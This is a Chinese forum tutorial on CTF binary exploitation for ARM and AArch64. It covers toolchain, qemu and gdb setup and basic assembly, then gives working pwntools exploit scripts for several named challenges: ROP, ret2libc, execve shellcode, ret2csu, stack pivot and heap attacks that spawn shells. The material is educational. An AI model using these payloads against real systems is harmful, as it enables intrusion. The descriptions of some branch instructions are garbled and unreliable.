> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-272332.htm)

> [原创] CTF 中 ARM & AArch64 架构下的 Pwn

CTF 中 ARM & AArch64 架构下的 Pwn
============================

环境配置
----

一般我们说的`arm`是`ARMv7`架构，是`32`位，而`aarch64`是`ARMv8`架构，也就是`64`位。

 

`ARM`软件包的安装：

```
sudo apt-get install gcc-arm-linux-gnueabi
sudo apt-get install gcc-aarch64-linux-gnu

```

在一般的`CTF`比赛中，`arm & aarch64`架构的题所给的`libc`都是`glibc`，当然也有少部分比赛所给的`libc`是`uclibc`或`musl-libc`，这点和`x86_64`架构下的题是一样的。

 

题目所给的`libc`一般是不带函数符号和调试符号的，而`ARM`架构也不像`x86_64`架构一样，可以把带符号的`deb`包（如`libc6-dbg_2.31-0ubuntu9.2_amd64.deb`）解压后放在与不带符号的`libc`同目录下的`.debug`文件夹中，调试的时候就可以自动加载符号了。

 

当然，我们也可以下载`arm`对应的带符号的`deb`包，然后在`pwndbg`中用`add-symbol-file`命令手动加载符号，但是那样太麻烦了。

 

所以，我们最好自己编译出对应版本的`libc`，就可以带符号并且进行源码级调试了，然而，我们一般用的都是`x86_64`架构，而我们现在需要编译出`ARM`架构下的`libc`，自然就不能用原先自带的`x86_64`架构下的`gcc/g++`进行编译了，而是需要进行**交叉编译**，也就需要相应的交叉编译工具链，这里我使用的是`linaro`公司维护的工具链。

 

源码建议在这里下载：[glibc_source_code](http://ftp.gnu.org/gnu/glibc "glibc_source_code")

 

交叉编译的工具链下载：[arm](http://releases.linaro.org/components/toolchain/binaries/7.5-2019.12/arm-linux-gnueabihf/gcc-linaro-7.5.0-2019.12-x86_64_arm-linux-gnueabihf.tar.xz "arm") [aarch64](http://releases.linaro.org/components/toolchain/binaries/7.5-2019.12/aarch64-linux-gnu/gcc-linaro-7.5.0-2019.12-x86_64_aarch64-linux-gnu.tar.xz "aarch64")

 

进行交叉编译的命令如下：  
**1. arm**

```
cd .../glibc-2.31
mkdir arm
mkdir build
cd build
CC=.../gcc-linaro-7.5.0-2019.12-x86_64_arm-linux-gnueabihf/bin/arm-linux-gnueabihf-gcc \
CXX=.../gcc-linaro-7.5.0-2019.12-x86_64_arm-linux-gnueabihf/bin/arm-linux-gnueabihf-g++ \
CFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" \
CXXFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" \
../configure \
--prefix=.../glibc-2.31/arm \
--host=arm-linux \
--target=arm-linux \
--disable-werror
make
make install

```

**2. aarch64**

```
cd .../glibc-2.31
mkdir arrch64
mkdir build
cd build
CC=.../gcc-linaro-7.5.0-2019.12-x86_64_aarch64-linux-gnu/bin/aarch64-linux-gnu-gcc \
CXX=.../gcc-linaro-7.5.0-2019.12-x86_64_aarch64-linux-gnu/bin/aarch64-linux-gnu-g++ \
CFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" \
CXXFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" \
../configure \
--prefix=.../glibc-2.31/aarch64 \
--host=aarch64-linux \
--target=aarch64-linux \
--disable-werror
make
make install

```

需要注意的是，我们交叉编译出来的`libc`会将绝对路径硬编码进去 (开`-fPIC`编译选项不知道能不能写相对路径进去，可以试试)，所以编译后`libc`所在路径是不能变动的，但是我们可以将`libc`所在的地址软链接到题目文件夹下，如：`ln -s .../glibc-2.31/aarch64/lib ./lib`。

 

比如设置的`--prefix`是`.../glibc-2.31/aarch64`，也就是我们最后`make install`后编译出的文件都存放在这个目录下，其实只需要保留其中的`lib`文件夹中与`libc`和`ld`相关的文件及其软链接就够了（也就四个文件），其他的都可以删掉，如果不需要源码级调试，源码也都可以删掉（其实这里建议大家只保留一些常用的源码文件夹即可）。

 

然后就是安装`qemu`了，因为我们无法`x86_64`架构下直接运行`ARM`架构的二进制文件，所以需要在`qemu`所模拟出的环境中跑，其实对`qemu`版本要求不高，直接`apt`一行安装即可：`sudo apt-get install qemu-user qemu-system`。

 

还有，我们调试`ARM`架构的时候需要`gdb-multiarch`，也是用`apt`一行安装即可：`sudo apt-get install gdb-multiarch`。

 

我们需要用`qemu`来运行所给的二进制文件，下面给出启动脚本和调试脚本：

 

**1. start.sh**

```
#!/bin/bash
qemu-aarch64 \
    -g 1234 \
    -L ./ ./pwn

```

如果是`arm`架构，则是`qemu-arm`。  
如果不需要调试，而是直接运行，则去掉`-g`选项。  
如果是运行静态编译的文件，则去掉`-L`选项。  
上面`-L ./`中的`./`代表重置的当前**根目录**。  
一般来说，所给的二进制文件所需要的`libc`和`ld`文件都被硬编码在其中的，所需的`libc`地址基本都是`/lib/libc.so.6`，所需的`ld`地址也都是`/lib/ld-...so..`这种，都需要从`/lib`，也就是根目录下的`lib`文件夹中去寻找。  
因此，若是我们当前目录下有所需的`lib`文件夹，那么根目录就要被设置为`./`，也就是当前目录。

 

**2. gdb.sh**

```
#!/bin/sh
gdb-multiarch -q \
    -ex "file ./pwn" \
    -ex "b ..." \
    -ex "dir .../glibc-source/2.31/stdio-common" \
    -ex "dir .../glibc-source/2.31/stdlib" \
    -ex "dir .../glibc-source/2.31/libio" \
    -ex "dir .../glibc-source/2.31/malloc" \
    -ex "target remote :1234" \
    -ex "c"

```

我这里将常用的源码文件夹移动了位置（不在编译`libc`的原目录下了），所以需要用`dir`命令重定位一下源码。

 

以上只是简单的说一说，更具体的可以自行查阅相关资料。

基本知识
----

先说说`qemu`吧，在`CTF`比赛中，绝大多数`ARM`架构的题都是在`qemu`模拟出的环境中跑的，而`qemu`有些不太安全的特性，比如它没有地址的随机化，也没有`NX`保护，即使题目所给的二进制文件开了`NX`和`PIE`保护，也只是对真机环境奏效，而在`qemu`中跑的时候，仍然相当于没有这些保护，也就是说，`qemu`中所有地址都是有可执行权限的（包括堆栈，甚至`bss`段等），然后`libc_base`和`elf_base`每次跑都是固定的，当然这个固定是指在同一个环境下，本地跑和远程跑的这个固定值极有可能不相同，因此有时候打远程仍需泄露`libc_base`这些信息（当然也可以选择爆破，一般和本地也就差一两位的样子）。

 

再来说说`arm`和`aarch64`架构的一些常用的汇编指令集：

### arm

`arm`架构下的寄存器和`x86_64`架构还是有很大区别的，其中`R0 ~ R3`是用来依次传递参数的，相当于`x64`下的`rdi, rsi, rdx`，`R0`还被用于存储函数的返回值，`R7`常用来存放系统调用号，`R11`是栈帧，相当于`ebp`，在`arm`中也被叫作`FP`，相应地，`R13`是栈顶，相当于`esp`，在`arm`中也被叫作`SP`，`R14(LP)`是用来存放函数的返回地址的，`R15`相当于`eip`，在`arm`中被叫作`PC`，但是在程序运行的过程中，`PC`存储着当前指令往后两条指令的位置，在`arm`架构中并不是像`x86_64`那样用`ret`返回，而是直接`pop {PC}`。

 

在`arm`中的`ldr`和`str`指令是必须清楚的，其中`ld`就是`load`（加载），`st`就是`store`（存储），而`r`自然就是`register`（寄存器），搞明白这些以后，这两个指令就很容易理解了（`cond`为条件）：

 

`LDR {cond} Rd, <addr>`：加载指定地址 (`addr`) 上的数据 (字)，放入到`Rd`寄存器中。

 

`STR {cond} Rd, <addr>`：将`Rd`寄存器中的数据 (字) 存储到指定地址(`addr`) 中。

 

当然，这两个指令有很多种写法，灵活多变：

 

`str r2, [r1, #2]`：寄存器`r2`中的值被存放到寄存器`r1`中的地址加`2`处的地址中，`r1`寄存器中的值不变;

 

`str r2, [r1, #2]!`：与上一条一样，不过最后`r1 += 4`，这里的`{!}`是可选后缀，若选用该后缀，则表示请求回写，也就是当数据传送完毕之后，将最后的地址写入到基址寄存器 (`Rn`) 中;

 

`ldr r2, [r1], #-2`：将`r1`寄存器里地址中的值给`r2`寄存器，最后`r1 -= 2`；

 

上面的立即数或者寄存器也类似，此外还可以有这些写法：

 

`str r2, [r1, r3, LSL#2]`：将寄存器`r2`中的值存储到寄存器`r1`中的地址加上`r3`寄存器中的值左移两位后的值所指向的地址中；

 

`ldr r2, [r1], r3, LSL#2`：将`r1`寄存器里地址中的值给`r2`寄存器，最后`r1 += r3 << 2`.

 

在`arm`中仍有`mov`指令，通常用于寄存器与寄存器间的数据传输，也可以传递立即数。

 

`mov r1, #0x10`：`r1 = 0x10`

 

`mov r1, r2`：`r1 = r2`

 

`mov r1, r2, LSL#2`：`r1 = r2 << 2`

 

由此可见，`ldr`和`str`指令通常用于寄存器与内存间的数据传递，其中会通过另一个寄存器作为中介，而`mov`指令则是通常用于两个寄存器之间数值的传递。

 

此外，还有数据块传输指令`LDM, STM`，具体请参考：[arm 汇编指令之数据块传输（LDM,STM）详解](https://blog.csdn.net/stephenbruce/article/details/51151147)。

 

其中提到了`STMFD`和`LDMFD`指令，可用作压栈和弹栈，如`STMFD SP! ,{R0-R7，LR}`和`LDMFD SP! ,{R0-R7，LR}`，但是在我们拿到的`CTF`题目中，常见的仍是`push {}`和`pop {}`指令。

 

还需要知道的是`add`和`sub`命令：

 

`add r1, r2, #2` 相当于 `r1 = r2 + 2`；

 

`sub r1, r2, r3` 相当于 `r1 = r2 - r3`.

 

还有跳转指令`B`相关的一些指令，相当于`jmp`：

 

`B Label`：无条件跳转到`Label`处；

 

`BL Label`：当程序跳转到标号`Label`处执行时，同时将当前的`PC`值保存到`R14`中；

 

`BX Label`：这里需要先提一下`arm`指令压缩形式的子集`Thumb`指令了，不像是`arm`指令是一条四个字节，`Thumb`指令一条两个字节，`arm`对应的`cpu`工作状态位为`0`，而`Thumb`对应的`cpu`工作状态位为`1`，我们从其中一个指令集跳到另外一个指令集的时候，需要同时修改其对应的`cpu`工作状态位，不然会报`invalid instrument`错误，当`BX`后面的地址值最后一个`bit`为`1`时，则转为`Thumb`模式，否则转为`arm`模式，直接`pop {pc}`这样跳转也有这种特性；

 

`BLX Label`：就是`BL + BX`指令共同作用的效果。

 

位运算命令：`and orr eor` 分别是 按位与、或、异或。

### aarch64

`aarch64`和`arm`架构相比，还是有一些汇编指令上的区别的：

 

首先仍是寄存器，在`64`位下都叫作`Xn`寄存器了，其对应的低`32`位叫作`Wn`寄存器，其中栈顶是`X31(SP)`寄存器，栈帧是`X29(FP)`寄存器，`X0 ~ X7`用来依次传递参数，`X0`存放着函数返回值，`X8`常用来存放系统调用号或一些函数的返回结果，`X32`是`PC`寄存器，`X30`存放着函数的返回地址 (`aarch64`中的`RET`指令返回`X30`寄存器中存放的地址)。

 

然后是跳转指令，仍有`B`，`BL`指令，新增了`BR`指令（向寄存器中的地址跳转），`BLR`组合指令。  
还有一些带判断的跳转指令：`b.ne`是不等则跳转，`b.eq`是等于则跳转，`b.le`是大于则跳转，`b.ge`是小于则跳转，`b.lt`是大于等于则跳转，`b.gt`是小于等于则跳转，`cbz`为结果等于零则跳转，`cbnz`为结果非零则跳转...

 

在`aarch64`架构下的一大变化就是，不再使用`push`和`pop`指令压栈和弹栈了，也没有`LDM`和`STM`指令，而是使用`STP`和`LDP`指令：

 

`STP x4, x5, [sp, #0x20]`：将`sp+0x20`处依次覆盖为`x4，x5`，即`x4`入栈到`sp+0x20`，`x5`入栈到`sp+0x28`，最后`sp`的位置不变。

 

`LDP x29, x30, [sp], #0x40`：将`sp`弹栈到`x29`，`sp+0x8`弹栈到`x30`，最后`sp += 0x40`。

 

其中，`STP`和`LDP`中的`P`是`pair`（一对）的意思，也就是说，仅可以同时读 / 写两个寄存器。

 

基本来说，常用的就是以上的命令，但是`arm`和`aarch64`的命令远远不止以上这些，希望各位读者自行查阅相关资料进行学习。

 

**【附】系统调用号：**

 

[基于 arm 架构的 linux 系统调用号](https://elixir.bootlin.com/linux/v5.13.19/source/arch/arm64/include/asm/unistd32.h#L35 "基于arm架构的linux系统调用号")

 

[基于 aarch64 架构的 linux 系统调用号](https://elixir.bootlin.com/linux/v5.13.19/source/include/uapi/asm-generic/unistd.h#L642 "基于aarch64架构的linux系统调用号")

一些例题
----

这部分就不准备细说了，因为这些题目难的可能只是对`arm`和`aarch64`架构不太熟悉，漏洞点和利用方式都和`x86_64`架构差不多，且利用手法也没有`x86_64`架构下那么花里胡哨，看看`exp`基本也就都清楚了。

### jarvisoj typo

静态编译的程序，也就不需要动态链接库了，因此`libc`中的`system`和`/bin/sh`字符串在所给的二进制文件中自然是有的，不过所给的二进制文件去除了符号表，我们不容易找到它们的位置。

 

这里建议先用`IDA`的`Rizzo`插件修复符号表，就可以清楚地看到`system`函数的位置了，不然用交叉引用来找的话比较麻烦。

 

[Rizzo 的 Github 项目地址](https://github.com/Reverier-Xu/Rizzo-IDA "Rizzo 的 Github 项目地址")

```
from pwn import *
context(os = "linux", arch = 'arm', log_level = 'debug')
 
io = process("qemu-arm ./pwn", shell = True)
 
gadget_addr = 0x20904 # pop {r0, r4, pc};
bin_sh_addr = 0x6c384
system_addr = 0x110B4
 
io.send(b'\n')
payload = b'a'*0x70 + p32(gadget_addr) + p32(bin_sh_addr) + p32(0) + p32(system_addr)
io.send(payload)
io.interactive()

```

### Codegate2018 melong

一个`ret2libc`...

 

需要注意的是，调用`puts`后，最后会进入`write`，但是并不是从头开始调用`write`函数的，我们知道，当进入一个函数的时候，会先`push {}`一串寄存器，再在该函数返回时，`pop {}`对应的寄存器，使得栈恢复到进入该函数前的状态，而这里由于从`puts`中走到`write`的时候，不是从头开始执行的，因此不会有前面`push {}`的过程，但是最后会有`pop {}`的发生，故会导致`write`返回的时候栈恢复不到原先的样子，因此，需要压进去一些垃圾数据来使栈恢复。

 

我本地和远程的`libc`版本不同，所以需要压进去的垃圾数据的个数也不同，这个需要自行调试，也体现出带符号表调试的必要性。

```
from pwn import *
context(os = 'linux', arch = 'arm', log_level = 'debug')
 
io = process("qemu-arm -L ./ ./pwn", shell = True)
# io = process("qemu-arm -g 1234 -L ./ ./pwn", shell = True)
# io = remote("node4.buuoj.cn", 28706)
 
elf = ELF("./pwn")
libc = ELF("./lib/libc-2.27.so")
# libc = ELF("./libc-2.30.so")
 
def check(height, weight):
    io.sendlineafter("Type the number:", b'1')
    io.sendlineafter("Your height(meters) : ", str(height))
    io.sendlineafter("Your weight(kilograms) : ", str(weight))
 
def PT(size):
    io.sendlineafter("Type the number:", b'3')
    io.sendlineafter("How long do you want to take personal training?\n", str(size))
 
def write_diary(payload):
    io.sendlineafter("Type the number:", b'4')
    io.send(payload)
 
def quit():
    io.sendlineafter("Type the number:", b'6')
 
if __name__ == '__main__':
    check(233, 233)
    PT(-1)
    pop_r0_pc = 0x11bbc
    payload = b'a'*0x54 + p32(pop_r0_pc) + p32(elf.got['puts']) + p32(elf.plt['puts']) + p32(0)*3 + p32(elf.sym['main'])
    # payload = b'a'*0x54 + p32(pop_r0_pc) + p32(elf.got['puts']) + p32(elf.plt['puts']) + p32(0)*5 + p32(elf.sym['main'])
    write_diary(payload)
    quit()
 
    io.recvuntil("See you again :)\n")
    libc.address = u32(io.recv(4)) - libc.sym['puts']
    success("libc_base:\t" + hex(libc.address))
 
    check(233, 233)
    PT(-1)
    payload = b'a'*0x54 + p32(pop_r0_pc) + p32(next(libc.search(b'/bin/sh'))) + p32(libc.sym['system'])
    write_diary(payload)
    quit()
    io.interactive()

```

### Root Me : stack_buffer_overflow_basic

一个`ret2shellcode`...

 

我都是手撸`shellcode`，这里`svc 0`相当于`int 0x80 / syscall`，在程序运行中，`pc`寄存器指向当前指令后两条指令的位置。

```
from pwn import *
context(os = 'linux', arch = 'arm', log_level = 'debug')
 
#io = process("qemu-arm -L ./ ./pwn", shell = True)
io = remote("node4.buuoj.cn", 26999)
 
io.sendlineafter("Give me data to dump:\n", b'leak')
shellcode_addr = int(io.recv(10), 16)
success("shellcode_addr:\t" + hex(shellcode_addr))
 
io.sendlineafter("Dump again (y/n):\n", b'y')
 
shellcode = asm('''
    eor r1, r1
    eor r2, r2
    mov r7, #11
    mov r0, pc
    svc 0
    .ascii "/bin/sh\\0"
''')
payload = shellcode.ljust(0xa4, b'\x00') + p32(shellcode_addr)
io.sendlineafter("Give me data to dump:\n", payload)
 
io.sendlineafter("Dump again (y/n):\n", b'n')
io.interactive()

```

### InCTF-2018 wARMup

观察以下这段汇编代码段：

```
.text:0001052C   SUB     R3, R11, #-buf
.text:00010530   MOV     R2, #0x78 ; 'x'     ; nbytes
.text:00010534   MOV     R1, R3              ; buf
.text:00010538   MOV     R0, #0              ; fd
.text:0001053C   BL      read

```

可以知道，`read`读入的源地址是由`R11`（相当于`ebp`）控制的，这点和`x86_64`架构下也是类似的。

 

因此，我们可以控制`R11`寄存器进行二次读入，将`shellcode`读入到`bss`段上，然后直接打过去就行（因为`qemu`所有地址都是可执行的，自然包括`bss`段）。

```
from pwn import *
context(os = 'linux', arch = 'arm', log_level = 'debug')
 
io = process("qemu-arm -L ./ ./pwn", shell = True)
# io = remote("node4.buuoj.cn", 28441)
elf = ELF("./pwn")
 
payload = b'a'*0x64 + p32(elf.bss() + 0x68) + p32(0x1052C)
io.send(payload)
 
shellcode = asm('''
    add r0, pc, #12
    mov r1, #0
    mov r2, #0
    mov r7, #11
    svc 0
    .ascii "/bin/sh\\0"
''')
payload = shellcode.ljust(0x68, b'\x00') + p32(elf.bss())
io.send(payload)
io.interactive()

```

### 上海骇极杯 2018 baby_arm

其实这个题若是`qemu`环境跑的话，任意地址都是有可执行权限的，所以直接`ret2shellcode`就能通：

```
from pwn import *
context(os = 'linux', arch = 'aarch64', log_level = 'debug')
 
io = process("qemu-aarch64 -L ./ ./pwn", shell = True)
# io = remote("node4.buuoj.cn", 27295)
elf = ELF("./pwn")
 
shellcode_addr = 0x411068
 
shellcode = asm('''
    add x0, x30, #20
    mov x1, xzr
    mov x2, xzr
    mov x8, #221
    svc 0
    .ascii "/bin/sh\\0"
''')
io.sendafter("Name:", shellcode)
 
payload = b'a'*0x48 + p64(shellcode_addr)
io.send(payload)
io.interactive()

```

但是这样就很没意思了，我们就把他当作真机的环境，需要我们用`mprotect`赋予`bss`段可执行权限，这样就是一个`aarch64`架构下的`ret2csu`了，不过和`x86_64`架构下的差不多，这里也就不多做分析了。

 

gadget 1 :

```
.text:00000000004008CC   LDP   X19, X20, [SP,#0x10] ; 将sp+0x10处数据给x19，sp+0x18处数据给x20
.text:00000000004008D0   LDP   X21, X22, [SP,#0x20] ; 将sp+0x20处数据给x21，sp+0x28处数据给x22
.text:00000000004008D4   LDP   X23, X24, [SP,#0x30] ; 将sp+0x300处数据给x23，sp+0x38处数据给x24
.text:00000000004008D8   LDP   X29, X30, [SP],#0x40 ; 将sp处数据给x29，sp+0x8处数据给x30，并将栈抬高64字节
.text:00000000004008DC   RET   ; 返回x30寄存器中存放的地址

```

gadget 2 :

```
.text:00000000004008AC   LDR    X3, [X21,X19,LSL#3] ; 将(x21+x19<<3)中的值（地址）赋给x3
.text:00000000004008B0   MOV    X2, X22 ; 将x22寄存器中的值赋给x2（部署3参）
.text:00000000004008B4   MOV    X1, X23 ; 将x23寄存器中的值赋给x1（部署2参）
.text:00000000004008B8   MOV    W0, W24 ; 将w24寄存器中的值赋给w0（部署1参）
.text:00000000004008BC   ADD    X19, X19, #1 ; x19寄存器中的值加一
.text:00000000004008C0   BLR    X3      ; 跳转至x3寄存器中存放的地址
.text:00000000004008C4   CMP    X19, X20 ; 比较x19寄存器与x20寄存器中的值
.text:00000000004008C8   B.NE   loc_4008AC ; 不等则跳转

```

注：`shellcode`中的`xzr`是清零寄存器。

```
from pwn import *
context(os = 'linux', arch = 'aarch64', log_level = 'debug')
 
io = process("qemu-aarch64 -L ./ ./pwn", shell = True)
# io = remote("node4.buuoj.cn", 27295)
elf = ELF("./pwn")
 
gadget1_addr = 0x4008CC
gadget2_addr = 0x4008AC
mprotect_addr = 0x411068
shellcode_addr = 0x411070
 
shellcode = asm('''
    add x0, x30, #20
    mov x1, xzr
    mov x2, xzr
    mov x8, #221
    svc 0
    .ascii "/bin/sh\\0"
''')
payload = p64(elf.plt['mprotect']) + shellcode
io.sendafter("Name:", payload)
 
payload = b'a'*0x48 + p64(gadget1_addr)
payload += p64(0) + p64(gadget2_addr) # X29 X30 (RET -> X30)  SP += 0x40
payload += p64(0) + p64(1) # X19 X20 (X19 + 1 == X20)
payload += p64(mprotect_addr) + p64(0x7) # X21(X3 = [X21], BLR X3)  X22(X2)
payload += p64(0x1000) + p64(shellcode_addr & 0xfff000) # X23(X1) X24(W0)
payload += p64(0) + p64(shellcode_addr) # X29 X30 (RET -> X30)
io.send(payload)
io.interactive()

```

### Root Me : stack_spraying

我是写了个栈迁移（`stack pivot`），其实方法有很多。

 

观察到下面这个`gadget`：

```
.text:00010680  SUB  SP, R11, #4
.text:00010684  POP  {R11,PC}

```

很容易想到，可以通过控制`R11`寄存器进行栈迁移。

 

这里也用到了上面`InCTF-2018 wARMup`一题所利用的方式，先将`gadget`读到了`bss`段上，然后再栈迁移过去。

 

需要注意一些细节，比如迁移到的地址需要在`bss`段的基础上抬高一段距离等等。

```
from pwn import *
context(os = 'linux', arch = 'arm', log_level = 'debug')
 
io = process("qemu-arm -L ./ ./pwn", shell = True)
# io = remote("node4.buuoj.cn", 28651)
elf = ELF("./pwn")
 
write_addr = elf.bss() + 0x300
payload = b'a'*0x40 + p32(write_addr + 0x44) + p32(0x10658)
io.sendline(payload)
 
payload = b'deadbeaf' + p32(write_addr + 0x20) + p32(0x105a0) + p32(write_addr + 0x38)
payload = payload.ljust(0x38, b'\x00') + b'/bin/sh\x00'
payload += p32(write_addr + 12) + p32(0x10680)
io.sendline(payload)
io.interactive()

```

### Root Me : use_after_free

由于`alias`索引没清空，导致了`UAF`，即使是`qemu`模拟的环境，本地和远程环境下固定的`libc_base`也会不一样，因此最好还是先泄露`libc_base`。

```
from pwn import *
context(os = 'linux', arch = 'arm', log_level = 'debug')
 
io = process("qemu-arm -L ./ ./pwn", shell = True)
# io = remote("node4.buuoj.cn", 28227)
 
elf = ELF("./pwn")
libc = ELF("./lib/libc.so.6")
 
io.sendline("add winmt")
sleep(0.1)
io.sendline("ctf")
sleep(0.1)
io.sendline("pwner")
sleep(0.1)
 
io.sendline("add WINMT")
sleep(0.1)
io.sendline("CTF")
sleep(0.1)
io.sendline("PWNER")
sleep(0.1)
 
io.sendline("del winmt")
sleep(0.1)
 
io.sendline("edit WINMT")
sleep(0.1)
io.sendline("CTF")
sleep(0.1)
io.sendline(b'a'*0x38 + p32(elf.got['strcmp']))
sleep(0.1)
io.sendline(str(2333))
sleep(0.1)
 
io.recv()
io.sendline("show winmt")
io.recvuntil("  Desc:  ")
libc.address = u32(io.recv(4)) - libc.sym['strcmp']
success("libc_base:\t" + hex(libc.address))
 
io.sendline("edit winmt")
sleep(0.1)
io.sendline("ctf")
sleep(0.1)
io.sendline(p32(libc.sym['system']) + p32(libc.sym['fflush']))
sleep(0.1)
io.sendline(str(6666))
sleep(0.1)
 
io.sendline("/bin/sh\x00")
io.interactive()

```

### 2021 蓝帽杯 portable

`arm`架构下很简单的一道堆题，漏洞点就在`switch`没有`default`卡住，导致可以继续向下执行，继而可以弄出`double free`。

```
from pwn import *
context(os = "linux", arch = 'arm', log_level = 'debug')
 
io = process("qemu-arm -L ./ ./pwn", shell = True)
 
elf = ELF("./pwn")
libc = ELF("./lib/libc-2.27.so")
 
def create(role, size = 0, name = "winmt"):
    io.sendlineafter(">> ", b'1')
    io.sendlineafter(">> ", str(role))
    if role == 0 :
        return
    io.sendlineafter("size?\n", str(size))
    io.sendafter("name?\n", name)
 
def delete(idx):
    io.sendlineafter(">> ", b'2')
    io.sendlineafter("index?\n", str(idx))
 
def show(idx):
    io.sendlineafter(">> ", b'3')
    io.sendlineafter("index?\n", str(idx))
 
def quit():
    io.sendlineafter(">> ", b'5')
 
if __name__ == '__main__':
    payload = p32(0)*7 + p32(1)
    create(1, 0x300, payload) # 0
    create(1, 0x20, b'/bin/sh\x00') # 1
    delete(0)
    create(0) # 0
    create(0) # 2
    show(2)
    io.recvuntil("player name: ")
    libc.address = u32(io.recv(4)) - 580 - libc.sym['main_arena']
    success("libc_base:\t" + hex(libc.address))
 
    create(1, 0x20) # 3
    delete(3)
    create(0) # 3
    delete(3)
    create(1, 0x20, p32(libc.sym['__free_hook'])) # 3
    create(1, 0x20, p32(libc.sym['system'])) # 4
    delete(1)
    io.interactive()

```

### 2020 第五空间 pwnme

`arm`架构下的堆题，不过这题的`libc`不是`glibc`了，而是`uclibc`，其实在这道题中没什么区别，一样的做就可以了，有堆溢出漏洞，又没有`PIE`，于是打一个`unsafe unlink`即可，很容易。

```
from pwn import *
context(os = "linux", arch = 'arm', log_level = 'debug')
 
io = process("qemu-arm -L ./ ./pwn", shell = True)
 
elf = ELF("./pwn")
libc = ELF("./lib/libc.so.0")
 
def show():
    io.sendlineafter(">>> ", b'1')
 
def add(size, content = b'winmt'):
    io.sendlineafter(">>> ", b'2')
    io.sendlineafter("Length:", str(size))
    io.sendafter("Tag:", content)
 
def edit(idx, size, content):
    io.sendlineafter(">>> ", b'3')
    io.sendlineafter("Index:", str(idx))
    io.sendlineafter("Length:", str(size))
    io.sendafter("Tag:", content)
 
def delete(idx):
    io.sendlineafter(">>> ", b'4')
    io.sendlineafter("Tag:", str(idx))
 
if __name__ == '__main__':
    add(0x10) # 0
    add(0x50) # 1
    add(0x10) # 2
    payload = p32(0) + p32(0x11) + p32(0x2106C - 4*3) + p32(0x2106C - 4*2) + p32(0x10) + p32(0x58)
    edit(0, len(payload), payload)
    delete(1)
    payload = p32(0)*2 + p32(0x10) + p32(elf.got['atoi'])
    edit(0, len(payload), payload)
    show()
    io.recvuntil("0 : ")
    libc.address = u32(io.recv(4)) - libc.sym['atoi']
    success("libc_base:\t" + hex(libc.address))
    edit(0, 4, p32(libc.sym['system']))
    io.sendlineafter(">>> ", b'/bin/sh\x00')
    io.interactive()

```

### 2021 DASCTF 1 月赛 ememarm

`aarch64`架构下的堆，很明显有一个`off by null`，简单构造利用一下即可。

 

需要注意的是`aarch64`架构下的`libc`泄露，由于跑`qemu`的时候，`libc_base`一般都是`0x4000XXX000`这样的地址，因此泄露数据的时候会被`\x00`截断，其实只需要泄露后三个字节（后六位），然后加上`0x4000000000`即可得到泄露出的`libc`地址。

```
from pwn import *
context(os = 'linux', arch = 'aarch64', log_level = 'debug')
 
io = process("qemu-aarch64 -L ./ ./pwn", shell = True)
 
elf = ELF("./pwn")
libc = ELF("./lib/libc-2.27.so")
 
def add(sign = 0, cx = "winmt", cy = "winmt"):
    io.sendlineafter("you choice: \n", b'1')
    io.sendafter("cx:\n", cx)
    io.sendafter("cy:\n", cy)
    io.sendlineafter("delete?\n", str(sign))
 
def del_edit(idx, content):
    io.sendlineafter("you choice: \n", b'3')
    io.sendline(str(idx))
    io.send(content)
 
def quit():
    io.sendlineafter("you choice: \n", b'5')
 
if __name__ == '__main__':
    io.send(b'/bin/sh\x00')
    add()
    add()
    add(1)
    add(1, p64(0), p64(0x21))
    del_edit(1, p64(0) + p64(0x31) + p64(0))
    add(1, p64(0), p64(elf.got['printf']))
    del_edit(2, p64(elf.got['puts']))
    add(0, p64(0), p64(elf.got['free']))
    del_edit(2, p64(elf.plt['puts']))
    libc.address = 0x4000000000 + u64(io.recv(3).ljust(8, b'\x00')) - libc.sym['puts']
    success("libc_base:\t" + hex(libc.address))
    del_edit(2, p64(libc.sym['system']))
    quit()
    io.interactive()

```

[【公告】 讲师招募 | 全新 “预付费” 模式，不想来试试吗？](https://bbs.pediy.com/thread-271621.htm)

[#基础知识](forum-171-1-180.htm) [#题解集锦](forum-171-1-187.htm) [#专题](forum-171-1-186.htm)